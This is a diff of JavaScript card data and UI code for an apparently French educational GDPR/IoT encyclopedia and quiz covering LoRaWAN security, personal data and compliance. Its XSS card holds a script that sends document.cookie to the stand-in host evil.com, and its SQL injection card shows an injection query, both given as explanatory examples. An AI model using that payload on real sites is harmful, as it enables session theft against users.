+        desc: "Point de départ de la collecte de données dans l'architecture LoRaWAN. En tant que premier maillon, il détermine souvent les finalités de traitement et la responsabilité juridique au sens de l'article 4.7 RGPD.",
+        example: "Capteur parking -> responsable de traitement = ville"
+      },
+      {
+        name: "Gateway",
+        aka: "Passerelle radio LoRaWAN",
+        desc: "Antenne relais convertissant les signaux LoRa en paquets IP. Les métadonnées radio (RSSI, SNR, timestamp) permettent de trianguler la position du device, générant une donnée de géolocalisation personnelle.",
+        example: "RSSI -85 dBm sur 3 gateways -> triangulation < 50m"
+      },
+      {
+        name: "Network Server",
+        aka: "Cœur réseau LoRaWAN (LNS)",
+        desc: "Serveur centralisant la gestion des devices, le dédoublonnage et le routage des paquets. Agit comme sous-traitant (Art. 28 RGPD) : un contrat de sous-traitance (DPA) est obligatoire entre le responsable de traitement et l'opérateur réseau.",
+        example: "ChirpStack / TTN -> DPA obligatoire avec l'hébergeur"
+      },
+      {
+        name: "Join Server",
+        aka: "Serveur d'authentification OTAA",
+        desc: "Gère l'authentification mutuelle device-réseau et la dérivation des clés de session (NwkSKey, AppSKey). Composant critique de la sécurité : une compromission permet l'usurpation d'identité de tout device enrôlé.",
+        example: "JoinAccept -> dérivation AppSKey + NwkSKey par device"
+      },
+      {
+        name: "App Server",
+        aka: "Serveur applicatif métier",
+        desc: "Seul serveur à détenir l'AppSKey pour déchiffrer le payload utilisateur. Point de responsabilité finale pour le traitement des données : c'est ici que les obligations RGPD (finalité, minimisation, conservation) s'appliquent pleinement.",
+        example: "AppSKey déchiffre le payload -> données en clair"
+      },
+      {
+        name: "Join OTAA",
+        aka: "Over-The-Air Activation",
+        desc: "Protocole d'activation dynamique négociant les clés de session à chaque jointure. Le DevNonce (nombre aléatoire unique) empêche les attaques par rejeu, garantissant l'intégrité de l'authentification initiale.",
+        example: "DevNonce incrémental -> rejet si déjà utilisé"
+      },
+      {
+        name: "Payload Formatter",
+        aka: "Décodeur JavaScript (Codec)",
+        desc: "Fonction de décodage transformant les octets bruts du payload en données structurées. Permet d'appliquer la minimisation (Art. 5.1.c) en ne décodant que les champs strictement nécessaires à la finalité déclarée.",
+        example: "bytes[0..1] -> température, ignorer bytes[2..3]"
+      }
+    ]
+  },
+  {
+    id: 2,
+    name: "Sécurité LoRaWAN",
+    color: "#f97316",
+    bgColor: "#3D200C",
+    cards: [
+      {
+        name: "NwkSKey",
+        aka: "Network Session Key (AES-128)",
+        desc: "Clé symétrique assurant l'intégrité des trames LoRaWAN via le calcul du MIC (Message Integrity Code). Partagée entre le device et le Network Server, elle garantit que l'origine de chaque trame est vérifiée (Art. 32 RGPD).",
+        example: "MIC = AES-CMAC(NwkSKey, payload) -> 4 octets"
+      },
+      {
+        name: "AppSKey",
+        aka: "Application Session Key (AES-128)",
+        desc: "Clé symétrique chiffrant le payload applicatif de bout en bout (end-to-end). Seuls le device et l'Application Server la détiennent, garantissant la confidentialité vis-à-vis de l'opérateur réseau.",
+        example: "Payload chiffré -> Network Server ne voit que des octets"
+      },
+      {
+        name: "AES-128",
+        aka: "Advanced Encryption Standard",
+        desc: "Algorithme de chiffrement symétrique par blocs adopté par la norme LoRaWAN. Recommandé par l'ANSSI pour la protection des données jusqu'au niveau « Diffusion Restreinte ». Taille de clé : 128 bits.",
+        example: "LoRaWAN 1.0.x -> AES-128 obligatoire pour NwkSKey et AppSKey"
+      },
+      {
+        name: "DevNonce",
+        aka: "Device Nonce (nombre unique)",
+        desc: "Nombre aléatoire généré par le device lors de chaque JoinRequest. Le Network Server rejette toute valeur déjà utilisée, empêchant les attaques par rejeu sur la procédure d'activation OTAA.",
+        example: "DevNonce=42 accepté, DevNonce=42 rejeté (déjà vu)"
+      },
+      {
+        name: "MIC",
+        aka: "Message Integrity Code (4 octets)",
+        desc: "Code d'intégrité calculé par AES-CMAC sur l'ensemble de la trame LoRaWAN. Toute modification du message en transit invalide le MIC, permettant au destinataire de détecter les altérations (Art. 32 RGPD — intégrité).",
+        example: "Trame altérée -> MIC invalide -> rejet par le LNS"
+      },
+      {
+        name: "Frame Counter",
+        aka: "FCntUp / FCntDown",
+        desc: "Compteur incrémental intégré à chaque trame LoRaWAN. Le récepteur rejette toute trame dont le compteur est inférieur ou égal au dernier compteur valide, bloquant les attaques par replay.",
+        example: "FCntUp=157 accepté, FCntUp=155 rejeté (replay détecté)"
+      },
+      {
+        name: "TLS 1.2/1.3",
+        aka: "Transport Layer Security",
+        desc: "Protocole de chiffrement sécurisant le lien IP entre la Gateway et le Network Server. Protège contre les attaques Man-in-the-Middle sur le segment backhaul, complémentaire au chiffrement LoRaWAN de bout en bout.",
+        example: "Gateway -> TLS 1.3 -> Network Server (certificat X.509)"
+      }
+    ]
+  },
+  {
+    id: 3,
+    name: "Données Personnelles",
+    color: "#a855f7",
+    bgColor: "#2D0C3D",
+    cards: [
+      {
+        name: "DevEUI relié",
+        aka: "Identifiant unique device (EUI-64)",
+        desc: "Identifiant matériel de 64 bits attribué à chaque device LoRaWAN. Devient une donnée personnelle dès qu'il est croisé avec un fichier client ou un référentiel interne permettant d'identifier la personne associée (donnée indirectement identifiante).",
+        example: "DevEUI + base client -> identification indirecte"
+      },
+      {
+        name: "Historique GW",
+        aka: "Métadonnées de connexion gateway",
+        desc: "L'historique des gateways contactées par un device constitue une trace de géolocalisation permettant de reconstituer les déplacements d'un individu. Donnée personnelle au sens de la CJUE (géolocalisation indirecte).",
+        example: "GW_Paris_12 à 8h, GW_Lyon à 14h -> trajet reconstitué"
+      },
+      {
+        name: "Timestamp",
+        aka: "Horodatage de réception",
+        desc: "L'heure précise de détection d'un événement peut révéler les rythmes de vie d'un individu : heures de réveil, habitudes de présence, cycles de travail. Donnée personnelle lorsqu'elle est associée à un identifiant.",
+        example: "Détection 06h30 chaque jour -> réveil régulier"
+      },
+      {
+        name: "RSSI",
+        aka: "Received Signal Strength Indicator (dBm)",
+        desc: "Puissance du signal radio reçue par une gateway. En combinant le RSSI de plusieurs gateways, on peut trianguler la position d'un device avec une précision de quelques dizaines de mètres (géolocalisation indirecte).",
+        example: "RSSI = -75 dBm, -90 dBm, -82 dBm -> triangulation"
+      },
+      {
+        name: "Compte Client",
+        aka: "Données d'identification directe",
+        desc: "Données directement identifiantes (nom, prénom, email, téléphone) nécessaires à la fourniture du service IoT. Base légale typique : exécution du contrat (Art. 6.1.b RGPD).",
+        example: "Jean Dupont, jean@mail.com -> données directes"
+      },
+      {
+        name: "MAC Wi-Fi",
+        aka: "Adresse MAC (Media Access Control)",
+        desc: "Identifiant matériel unique et permanent de l'interface réseau. Considéré comme une donnée personnelle par le G29 (WP216) car il permet de suivre un équipement et, par extension, son propriétaire dans la durée.",
+        example: "AA:BB:CC:DD:EE:FF -> suivi permanent du device"
+      },
+      {
+        name: "Adresse IP",
+        aka: "Internet Protocol Address (v4/v6)",
+        desc: "Identifiant réseau considéré comme une donnée personnelle par la jurisprudence européenne (CJUE, Breyer c. Allemagne, 2016). Même une IP dynamique est personnelle si le FAI peut la relier à un abonné.",
+        example: "192.168.1.42 -> donnée personnelle (CJUE 2016)"
+      }
+    ]
+  },
+  {
+    id: 4,
+    name: "Données Sensibles",
+    color: "#22c55e",
+    bgColor: "#0C3D1A",
+    cards: [
+      {
+        name: "Rythme Cardiaque",
+        aka: "BPM (Battements Par Minute)",
+        desc: "Donnée de santé au sens de l'article 9 RGPD : son traitement est interdit sauf consentement explicite, obligation légale ou finalité médicale. En IoT, les montres et bracelets connectés génèrent massivement ce type de données.",
+        example: "BPM capteur MAX30102 -> Art. 9 + hébergement HDS"
+      },
+      {
+        name: "Saturation SpO2",
+        aka: "Saturation en oxygène du sang",
+        desc: "Indicateur médical mesurant le taux d'oxygène sanguin. Traitement à risque élevé nécessitant une Analyse d'Impact relative à la Protection des Données (AIPD, Art. 35 RGPD) préalable à toute mise en œuvre.",
+        example: "SpO2 < 90% -> alerte médicale + AIPD obligatoire"
+      },
+      {
+        name: "ECG",
+        aka: "Électrocardiogramme",
+        desc: "Trace de l'activité électrique du cœur, donnée de santé hautement sensible. Exige un chiffrement renforcé au repos et en transit (Art. 32 RGPD) et un hébergement HDS en France.",
+        example: "Apple Watch ECG -> donnée médicale, pas seulement « bien-être »"
+      },
+      {
+        name: "Données Génétiques",
+        aka: "ADN / Séquençage génomique",
+        desc: "Révèlent des prédispositions héréditaires et sont une catégorie explicite de l'article 9 RGPD. Traitement interdit sans base légale explicite. En IoT : kits de diagnostic connectés, séquenceurs portables.",
+        example: "Kit ADN connecté -> Art. 9 + consentement explicite"
+      },
+      {
+        name: "Lieu de Culte",
+        aka: "Point d'Intérêt religieux (POI)",
+        desc: "La géolocalisation répétée à proximité d'un lieu de culte peut révéler des convictions religieuses ou philosophiques par inférence. Catégorie spéciale de l'article 9 RGPD déductible des données IoT (GPS, beacons).",
+        example: "Géolocalisation hebdomadaire -> inférence religieuse"
+      },
+      {
+        name: "Badge Syndical",
+        aka: "Badge RFID d'accès syndical",
+        desc: "Révèle l'appartenance syndicale, donnée ultra-sensible dont le traitement est interdit (Art. 9 RGPD). En IoT, un système de contrôle d'accès RFID peut involontairement générer cette catégorie de données.",
+        example: "Lecteur RFID local syndical -> donnée Art. 9"
+      },
+      {
+        name: "Empreinte Digitale",
+        aka: "Donnée biométrique d'identification",
+        desc: "Donnée biométrique permettant l'identification unique d'une personne physique. Strictement encadrée par la CNIL et l'article 9 RGPD. En IoT : capteurs d'empreintes sur objets connectés, serrures biométriques.",
+        example: "Serrure connectée biométrique -> Art. 9 + AIPD"
+      }
+    ]
+  },
+  {
+    id: 5,
+    name: "Principes RGPD",
+    color: "#f59e0b",
+    bgColor: "#3D2E0C",
+    cards: [
+      {
+        name: "Privacy by Design",
+        aka: "Protection des données dès la conception (Art. 25.1)",
+        desc: "Obligation d'intégrer la protection des données personnelles dès la phase de conception de tout système, service ou produit. Ne se limite pas à la technique : inclut les processus organisationnels et les choix d'architecture.",
+        example: "Choix edge computing dès le cahier des charges -> minimisation native"
+      },
+      {
+        name: "Privacy by Default",
+        aka: "Protection par défaut (Art. 25.2)",
+        desc: "Les réglages d'usine doivent être les plus protecteurs possible : collecte minimale, accès restreint, durée de conservation courte. L'utilisateur doit pouvoir étendre les permissions, jamais les restreindre après coup.",
+        example: "GPS désactivé par défaut, opt-in explicite requis"
+      },
+      {
+        name: "Minimisation",
+        aka: "Adéquation et pertinence (Art. 5.1.c)",
+        desc: "Ne collecter que les données strictement nécessaires à la finalité déclarée. En IoT, cela implique de filtrer les mesures à la source (edge computing) plutôt que d'envoyer toutes les données brutes dans le cloud.",
+        example: "Envoyer la moyenne horaire plutôt que chaque mesure"
+      },
+      {
+        name: "Limitation de Conservation",
+        aka: "Durée de stockage définie (Art. 5.1.e)",
+        desc: "Les données personnelles ne peuvent être conservées au-delà de la durée nécessaire à la finalité pour laquelle elles ont été collectées. Une politique de purge automatique doit être implémentée et documentée.",
+        example: "Purge automatique des logs > 12 mois"
+      },
+      {
+        name: "Transparence",
+        aka: "Information des personnes (Art. 13-14)",
+        desc: "Obligation d'informer clairement les personnes concernées sur l'identité du responsable, les finalités, la base légale, la durée de conservation et les droits exercables. L'information doit être concise et accessible.",
+        example: "Mention d'information sur le boîtier IoT + politique en ligne"
+      },
+      {
+        name: "Registre des Traitements",
+        aka: "Documentation interne (Art. 30)",
+        desc: "Document interne listant tous les traitements de données personnelles de l'organisme : finalités, catégories de données, destinataires, durées, mesures de sécurité. Obligatoire pour les organismes de plus de 250 salariés ou traitant des données sensibles.",
+        example: "Registre RGPD -> colonne « capteurs IoT bâtiment »"
+      },
+      {
+        name: "Sécurité des Traitements",
+        aka: "Mesures techniques et organisationnelles (Art. 32)",
+        desc: "Obligation de mettre en œuvre des mesures de sécurité adaptées au risque : chiffrement, pseudonymisation, contrôle d'accès, tests réguliers. L'évaluation doit tenir compte de l'état de l'art et du coût de mise en œuvre.",
+        example: "AES-128 + TLS 1.3 + audits trimestriels"
+      }
+    ]
+  },
+  {
+    id: 6,
+    name: "Développement & Code",
+    color: "#3b82f6",
+    bgColor: "#0C1F3D",
+    cards: [
+      {
+        name: "Gestion des Secrets",
+        aka: "Vault / Coffre-fort de clés API",
+        desc: "Les clés API, mots de passe et tokens ne doivent jamais être stockés en clair dans le code source ou les fichiers de configuration. Utiliser un coffre-fort numérique (HashiCorp Vault, AWS Secrets Manager) et des variables d'environnement.",
+        example: ".env + .gitignore -> jamais de secret dans le dépôt Git"
+      },
+      {
+        name: "Versioning & Git",
+        aka: "Contrôle de version (historique)",
+        desc: "L'historique Git conserve indéfiniment chaque modification. Un secret committé par erreur reste accessible dans l'historique même après suppression. Vérifier systématiquement avec git-secrets ou gitleaks avant chaque push.",
+        example: "git log -p | grep \"API_KEY\" -> audit de l'historique"
+      },
+      {
+        name: "CI/CD & Tests",
+        aka: "Intégration continue / Déploiement continu",
+        desc: "Les pipelines automatisés doivent utiliser exclusivement des données fictives (Faker) en environnement de test. Les tests d'intégration ne doivent jamais accéder aux bases de production contenant des données personnelles réelles.",
+        example: "pytest --fixtures -> jeu de données généré par Faker"
+      },
+      {
+        name: "Isolation des Environnements",
+        aka: "Séparation Dev / Staging / Prod",
+        desc: "Cloisonner strictement les bases de données de développement, de test et de production. Les données personnelles de production ne doivent jamais être copiées dans un environnement de développement sans anonymisation préalable.",
+        example: "pg_dump prod | anonymize.py | pg_restore dev"
+      },
+      {
+        name: "Documentation Technique",
+        aka: "README / Architecture Decision Records",
+        desc: "Documenter les choix de sécurité et de protection des données pour démontrer la conformité auprès de la CNIL (principe d'accountability, Art. 5.2 RGPD). Les ADR (Architecture Decision Records) tracent les décisions techniques.",
+        example: "ADR-003 : choix HMAC-SHA256 pour la pseudonymisation"
+      },
+      {
+        name: "Revue de Code",
+        aka: "Code Review / Pair Programming",
+        desc: "Validation humaine systématique du code avant merge pour détecter les failles de sécurité, les fuites de données ou les non-conformités RGPD. Complément des outils d'analyse statique automatisés (SAST).",
+        example: "Pull Request -> checklist RGPD avant merge"
+      },
+      {
+        name: "Licences Open Source",
+        aka: "Conformité juridique des dépendances",
+        desc: "Vérifier la licence de chaque bibliothèque tierce pour assurer la compatibilité avec le projet et les obligations contractuelles. Certaines licences (GPL, AGPL) imposent des obligations de redistribution du code source.",
+        example: "npm audit + license-checker -> rapport de conformité"
+      }
+    ]
+  },
+  {
+    id: 7,
+    name: "Cloud & Architecture",
+    color: "#7dd3fc",
+    bgColor: "#0C2D3D",
+    cards: [
+      {
+        name: "Edge Computing",
+        aka: "Traitement local à la source",
+        desc: "Traiter les données au plus près du capteur pour réduire les transferts vers le cloud. Applique les principes de minimisation (Art. 5.1.c) et de sécurité (Art. 32) en limitant l'exposition des données personnelles sur le réseau.",
+        example: "ESP32 calcule la moyenne -> envoie 1 valeur/heure au lieu de 60"
+      },
+      {
+        name: "Cloud Public",
+        aka: "AWS / Azure / GCP (IaaS/PaaS)",
+        desc: "Recours à un sous-traitant majeur pour l'hébergement. Le contrat de sous-traitance (DPA, Art. 28 RGPD) est obligatoire et doit préciser les mesures techniques, la localisation des données et les conditions d'audit.",
+        example: "Azure IoT Hub -> DPA Microsoft + région EU-West"
+      },
+      {
+        name: "Hébergement On-Premise",
+        aka: "Infrastructure souveraine locale",
+        desc: "Conserver la maîtrise totale des serveurs et de la localisation physique des données. Élimine le risque de transfert hors UE mais impose la responsabilité complète de la sécurité physique et logique.",
+        example: "Serveur rack local -> pas de transfert Art. 44-50"
+      },
+      {
+        name: "DPA",
+        aka: "Data Processing Agreement (Art. 28)",
+        desc: "Contrat juridique obligatoire entre le responsable de traitement et tout sous-traitant. Doit préciser : objet et durée, nature et finalité, types de données, obligations de sécurité et conditions de sous-traitance ultérieure.",
+        example: "DPA AWS -> clauses Art. 28 + CCT pour transferts hors UE"
+      },
+      {
+        name: "Localisation des Données",
+        aka: "Transferts internationaux (Art. 44-50)",
+        desc: "Les données personnelles ne peuvent être transférées hors UE que vers un pays disposant d'une décision d'adéquation ou avec des garanties appropriées (CCT, BCR). Le Data Privacy Framework UE-USA (juillet 2023) encadre les transferts vers les États-Unis.",
+        example: "DPF UE-USA (2023) pour AWS US, CCT pour les autres pays tiers"
+      },
+      {
+        name: "Architecture Microservices",
+        aka: "Décomposition en services isolés",
+        desc: "Décomposer l'application en services indépendants communiquant par API. Limite l'impact d'une compromission à un seul service (blast radius) et facilite l'application du principe du moindre privilège par service.",
+        example: "Service « capteurs » isolé du service « facturation »"
+      },
+      {
+        name: "Chiffrement BDD",
+        aka: "Encryption at Rest (TDE/LUKS)",
+        desc: "Chiffrer les bases de données au repos pour les rendre illisibles sans la clé de déchiffrement. Mesure technique exigée par l'article 32 RGPD. Technologies : TDE (Transparent Data Encryption), LUKS, BitLocker.",
+        example: "PostgreSQL + TDE -> données illisibles sur le disque"
+      }
+    ]
+  },
+  {
+    id: 8,
+    name: "Droits des Personnes",
+    color: "#8b5cf6",
+    bgColor: "#1A0C3D",
+    cards: [
+      {
+        name: "Consentement",
+        aka: "Opt-in libre et éclairé (Art. 7)",
+        desc: "Accord positif, spécifique, éclairé et univoque de la personne concernée. Le consentement doit être aussi facile à retirer qu'à donner. En IoT, le recueil du consentement est complexe sur des objets sans interface.",
+        example: "Bouton physique d'appairage = acte positif de consentement"
+      },
+      {
+        name: "Exécution du Contrat",
+        aka: "Base légale contractuelle (Art. 6.1.b)",
+        desc: "Le traitement est licite lorsqu'il est nécessaire à l'exécution d'un contrat auquel la personne est partie. Base légale fréquente pour les services IoT commerciaux (abonnement, maintenance).",
+        example: "Service de monitoring IoT -> contrat de service"
+      },
+      {
+        name: "Intérêt Légitime",
+        aka: "Balance des intérêts (Art. 6.1.f)",
+        desc: "Le responsable peut traiter des données si son intérêt légitime prévaut sur les droits de la personne. Nécessite une mise en balance documentée (test de proportionnalité). Non applicable aux données sensibles (Art. 9).",
+        example: "Sécurité du réseau IoT -> intérêt légitime documenté"
+      },
+      {
+        name: "Droit d'Accès",
+        aka: "Obtention d'une copie (Art. 15)",
+        desc: "Toute personne peut obtenir une copie de l'ensemble des données personnelles la concernant, ainsi que les informations sur les finalités, les destinataires et la durée de conservation. Délai de réponse : 1 mois.",
+        example: "« Quelles données mon capteur collecte-t-il sur moi ? »"
+      },
+      {
+        name: "Droit de Rectification",
+        aka: "Correction des inexactitudes (Art. 16)",
+        desc: "Droit de faire corriger des données personnelles inexactes ou de compléter des données incomplètes. En IoT, cela peut impliquer de recalibrer un capteur ou de corriger un identifiant d'association device-personne.",
+        example: "DevEUI associé au mauvais résident -> rectification"
+      },
+      {
+        name: "Droit à l'Effacement",
+        aka: "Droit à l'oubli (Art. 17)",
+        desc: "Droit de demander la suppression définitive de ses données personnelles lorsque le traitement n'est plus nécessaire, le consentement est retiré, ou le traitement est illicite. Non absolu : des exceptions existent (obligation légale, archivage).",
+        example: "Désabonnement service IoT -> effacement des historiques"
+      },
+      {
+        name: "Droit à la Portabilité",
+        aka: "Export dans un format structuré (Art. 20)",
+        desc: "Droit de recevoir ses données dans un format structuré, couramment utilisé et lisible par machine (JSON, CSV). Permet de transférer ses données d'un prestataire IoT à un autre sans perte.",
+        example: "Export JSON des données capteur -> import chez un concurrent"
+      }
+    ]
+  },
+  {
+    id: 9,
+    name: "Incidents & Conformité",
+    color: "#f43f5e",
+    bgColor: "#3D0C14",
+    cards: [
+      {
+        name: "Notification 72h",
+        aka: "Notification de violation (Art. 33-34)",
+        desc: "Obligation de notifier la CNIL dans les 72 heures suivant la découverte d'une violation de données personnelles. Si le risque est élevé pour les personnes, celles-ci doivent également être notifiées sans délai indu (Art. 34).",
+        example: "Fuite de BDD IoT -> notification CNIL + personnes concernées"
+      },
+      {
+        name: "Injection SQL",
+        aka: "SQLi (OWASP A03:2021)",
+        desc: "Technique d'attaque exploitant des formulaires ou des API mal protégés pour injecter des commandes SQL dans la base de données. Peut permettre l'exfiltration massive de données personnelles. Prévention : requêtes paramétrées.",
+        example: "SELECT * FROM users WHERE id = '1 OR 1=1' -> dump complet"
+      },
+      {
+        name: "XSS",
+        aka: "Cross-Site Scripting (OWASP A07:2021)",
+        desc: "Injection de code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Permet le vol de cookies de session, la redirection vers des sites de phishing ou la modification du contenu affiché.",
+        example: "&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;"
+      },
+      {
+        name: "Brute Force",
+        aka: "Attaque par essais exhaustifs",
+        desc: "Attaque par essais systématiques de mots de passe ou de clés. En IoT, les identifiants par défaut non modifiés (admin/admin) sont le vecteur principal. Contre-mesures : fail2ban, verrouillage temporaire, MFA.",
+        example: "Mirai botnet -> scan des credentials par défaut IoT"
+      },
+      {
+        name: "Ransomware",
+        aka: "Rançongiciel (chiffrement malveillant)",
+        desc: "Logiciel malveillant chiffrant les données de la victime et exigeant une rançon. En contexte IoT, un ransomware peut paralyser une infrastructure critique (hôpital, industrie). Constitue une violation de données à notifier (Art. 33).",
+        example: "Ransomware sur serveur IoT -> notification 72h obligatoire"
+      },
+      {
+        name: "Traceurs & Cookies",
+        aka: "Technologies de suivi (ePrivacy)",
+        desc: "Les cookies et traceurs sont soumis au consentement préalable avant tout dépôt sur le terminal de l'utilisateur (directive ePrivacy, transposée en France par la loi Informatique et Libertés). Les traceurs techniques essentiels sont exemptes.",
+        example: "Bandeau cookies -> consentement avant traceurs analytics"
+      },
+      {
+        name: "AIPD Obligatoire",
+        aka: "Analyse d'Impact (Art. 35 RGPD)",
+        desc: "Étude obligatoire avant tout traitement présentant un risque élevé pour les droits et libertés des personnes. La CNIL publie une liste de traitements nécessitant une AIPD. Les traitements IoT à grande échelle y figurent systématiquement.",
+        example: "Déploiement 10 000 capteurs -> AIPD préalable obligatoire"
+      }
+    ]
+  },
+  {
+    id: 10,
+    name: "Anonymisation & Pseudonymisation",
+    color: "#10b981",
+    bgColor: "#0C3D2A",
+    cards: [
+      {
+        name: "Anonymisation",
+        aka: "Suppression irréversible du lien identifiant",
+        desc: "Processus rendant impossible toute réidentification d'une personne physique, même par croisement avec des données externes. Une fois anonymisées, les données sortent du champ du RGPD. Le processus doit être irréversible et vérifié par les 3 critères du G29.",
+        example: "Suppression DevEUI + généralisation spatiale + bruit statistique"
+      },
+      {
+        name: "Pseudonymisation",
+        aka: "Remplacement par un alias réversible (Art. 4.5)",
+        desc: "Remplacement d'un identifiant direct par un pseudonyme (code, hash, token). La donnée reste personnelle car la correspondance est conservée quelque part. Mesure de sécurité recommandée mais pas suffisante pour l'anonymat.",
+        example: "Jean Dupont -> USR_7F3A (table de correspondance sécurisée)"
+      },
+      {
+        name: "Trois Critères du G29",
+        aka: "WP216 — Test d'anonymisation",
+        desc: "Le Groupe de travail Article 29 (G29) définit trois critères pour évaluer la robustesse d'une anonymisation : non-individualisation (impossible d'isoler un individu), non-corrélation (impossible de relier des jeux de données), non-inférence (impossible de déduire des informations).",
+        example: "K-anonymat satisfait critère 1, mais pas forcément 2 et 3"
+      },
+      {
+        name: "K-Anonymat",
+        aka: "K-Anonymity (Sweeney, 2002)",
+        desc: "Méthode garantissant que chaque individu dans un jeu de données est indistinguable d'au moins k-1 autres individus sur un ensemble de quasi-identifiants. Un k trop faible (k=2) reste vulnérable aux attaques par homogénéité.",
+        example: "k=5 -> chaque ligne partagée avec au moins 4 autres personnes"
+      },
+      {
+        name: "SHA-256",
+        aka: "Secure Hash Algorithm (256 bits)",
+        desc: "Fonction de hachage cryptographique utilisée en pseudonymisation pour remplacer un identifiant par une empreinte fixe. Attention : sans sel (salt) ni clé secrète, un hash SHA-256 reste vulnérable aux attaques par dictionnaire ou rainbow table. Préférer HMAC-SHA256.",
+        example: "SHA-256(\"jean@mail.com\") -> empreinte fixe (VULNÉRABLE sans sel)"
+      },
+      {
+        name: "Données Synthétiques",
+        aka: "Faker / Générateur de données fictives",
+        desc: "Jeux de données entièrement fictifs générés par des bibliothèques (Faker, Mimesis) pour les environnements de développement et de test. Éliminent tout risque RGPD car aucune donnée réelle n'est utilisée.",
+        example: "faker.name() -> « Marie Martin » (personne inexistante)"
+      },
+      {
+        name: "Agrégation",
+        aka: "Consolidation statistique",
+        desc: "Technique consistant à regrouper des données individuelles en statistiques agrégées (moyenne, médiane, somme) pour masquer les contributions individuelles. L'agrégation spatiale (par quartier) ou temporelle (par heure) renforce l'anonymat.",
+        example: "Température moyenne du quartier (50 capteurs) -> anonyme"
+      },
+      {
+        name: "Température CPU",
+        aka: "Donnée technique système",
+        desc: "Information purement technique sur l'état thermique du processeur d'un device IoT. N'identifie aucune personne physique et ne constitue pas une donnée personnelle. Exemple typique de donnée anonyme par nature.",
+        example: "CPU 42°C -> donnée technique, hors champ RGPD"
+      },
+      {
+        name: "Version Firmware",
+        aka: "Numéro de build logiciel",
+        desc: "Information générique sur l'état logiciel du parc de devices. Aucun lien avec une personne physique. Utile pour la gestion de parc et les mises à jour de sécurité, sans implication RGPD.",
+        example: "FW v2.3.1 -> information de parc, pas de donnée personnelle"
+      },
+      {
+        name: "RSSI Moyen",
+        aka: "Moyenne statistique du signal",
+        desc: "Moyenne de la puissance du signal sur un ensemble de devices. L'agrégation empêche l'individualisation d'un device spécifique, satisfaisant le premier critère d'anonymisation du G29 (non-individualisation).",
+        example: "RSSI moyen = -82 dBm sur 50 devices -> anonyme"
+      },
+      {
+        name: "Données INSEE",
+        aka: "Statistiques publiques agrégées",
+        desc: "Données démographiques et économiques publiées par l'INSEE, agrégées par zones géographiques suffisamment larges pour garantir l'anonymat individuel. Relève de l'Open Data et ne contient aucune donnée personnelle.",
+        example: "Population commune X = 12 450 -> Open Data"
+      },
+      {
+        name: "Pluviométrie",
+        aka: "Donnée météorologique naturelle",
+        desc: "Mesure de phénomènes naturels (précipitations, vent, ensoleillement) sans aucun lien avec un individu. Donnée anonyme par nature, librement exploitable sans contrainte RGPD.",
+        example: "12 mm de pluie -> donnée environnementale, pas personnelle"
+      },
+      {
+        name: "Comptage Public",
+        aka: "Flux de passages anonymes",
+        desc: "Comptage du volume de personnes dans un lieu public sans identification individuelle. Anonyme par conception si le système ne capture aucune image ni identifiant. Attention aux systèmes de comptage par MAC Wi-Fi (donnée personnelle).",
+        example: "1 247 passages / jour -> compteur infrarouge = anonyme"
+      },
+      {
+        name: "Moyenne Spatiale",
+        aka: "Agrégation par zone géographique",
+        desc: "Calcul d'une valeur moyenne sur une zone géographique suffisamment étendue pour garantir l'anonymat des émetteurs individuels. Plus la zone est petite, plus le risque de réidentification augmente.",
+        example: "Température moyenne du quartier -> anonyme si > 30 foyers"
+      }
+    ]
+  }
+];
+
+// ============================================
+// STATE & UTILITIES
+// ============================================
+
+let currentTheme = localStorage.getItem('theme') || 'dark';
+let currentView = 'encyclopedia';
+let searchQuery = '';
+let activeFamily = 'all';
+let visibleCards = [];
+
+// Quiz state
+let quizMode = null;
+let quizConfig = {
+  count: 10,
+  family: 'all',
+  timer: false
+};
+let currentQuestion = 0;
+let quizQuestions = [];
+let userAnswers = [];
+let quizStartTime = 0;
+
+function getAllCards() {
+  return families.flatMap(f => f.cards.map(c => ({ ...c, familyId: f.id })));
+}
+
+function getFilteredCards() {
+  let cards = getAllCards();
+  if (activeFamily !== 'all') {
+    cards = cards.filter(c => c.familyId === parseInt(activeFamily));
+  }
+  if (searchQuery.trim()) {
+    const query = searchQuery.toLowerCase();
+    cards = cards.filter(c =>
+      c.name.toLowerCase().includes(query) ||
+      c.aka.toLowerCase().includes(query) ||
+      c.desc.toLowerCase().includes(query)
+    );
+  }
+  return cards;
+}
+
+function shuffle(arr) {
+  const copy = [...arr];
+  for (let i = copy.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [copy[i], copy[j]] = [copy[j], copy[i]];
+  }
+  return copy;
+}
+
+// ============================================
+// THEME MANAGEMENT
+// ============================================
+
+function applyTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  localStorage.setItem('theme', theme);
+  updateThemeIcon();
+}
+
+function updateThemeIcon() {
+  const icon = document.getElementById('themeIcon');
+  if (currentTheme === 'dark') {
+    icon.textContent = '◑';
+  } else {
+    icon.textContent = '◐';
+  }
+}
+
+document.getElementById('themeToggle').addEventListener('click', () => {
+  currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
+  applyTheme(currentTheme);
+});
+
+// ============================================
+// ENCYCLOPEDIA RENDERING
+// ============================================
+
+function renderFilterPills() {
+  const container = document.querySelector('.filter-pills');
+  container.innerHTML = '';
+
+  const allBtn = document.createElement('button');
+  allBtn.className = `filter-pill ${activeFamily === 'all' ? 'active' : ''}`;
+  allBtn.textContent = 'Toutes';
+  allBtn.addEventListener('click', () => {
+    activeFamily = 'all';
+    renderFilterPills();
+    renderFamilies();
+    updateCounter();
+  });
+  container.appendChild(allBtn);
+
+  families.forEach(fam => {
+    const btn = document.createElement('button');
+    btn.className = `filter-pill ${activeFamily === fam.id.toString() ? 'active' : ''}`;
+    btn.textContent = fam.name;
+    btn.addEventListener('click', () => {
+      activeFamily = fam.id.toString();
+      renderFilterPills();
+      renderFamilies();
+      updateCounter();
+    });
+    container.appendChild(btn);
+  });
+}
+
+function renderFamilies() {
+  const container = document.getElementById('familiesContainer');
+  container.innerHTML = '';
+
+  const cards = getFilteredCards();
+  const grouped = {};
+
+  cards.forEach(card => {
+    if (!grouped[card.familyId]) grouped[card.familyId] = [];
+    grouped[card.familyId].push(card);
+  });
+
+  families.forEach(fam => {
+    if (!grouped[fam.id]) return;
+
+    const familyGroup = document.createElement('div');
+    familyGroup.className = 'family-group';
+    familyGroup.style.setProperty('--fam-color', fam.color);
+
+    const header = document.createElement('div');
+    header.className = 'family-header';
+    header.style.borderBottomColor = fam.color;
+
+    const title = document.createElement('h2');
+    title.className = 'family-title';
